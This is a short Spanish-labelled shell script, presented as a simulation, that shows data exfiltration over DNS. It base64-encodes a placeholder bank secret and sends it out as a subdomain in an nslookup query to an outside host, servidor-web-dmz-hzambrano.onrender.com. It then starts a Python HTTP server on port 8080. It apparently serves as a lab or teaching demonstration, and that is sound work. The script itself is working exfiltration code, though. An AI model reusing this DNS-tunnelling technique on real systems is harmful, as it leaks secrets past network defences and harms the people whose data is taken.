#!/bin/sh

DATOS_SENSIBLES="clave_secreta_banco_2026"
DATOS_CODIFICADOS=$(echo -n "$DATOS_SENSIBLES" | base64 | tr -d '=')

echo "=== SIMULACIÓN: EXFILTRACIÓN DE DATOS VÍA CONSULTAS DNS ==="
echo "Dato original: $DATOS_SENSIBLES"
echo "Dato codificado: $DATOS_CODIFICADOS"
echo "Enviando consulta DNS con el payload incrustado..."

nslookup "${DATOS_CODIFICADOS}.servidor-web-dmz-hzambrano.onrender.com"

echo "=== CONSULTA DNS ENVIADA ==="

python3 -m http.server 8080
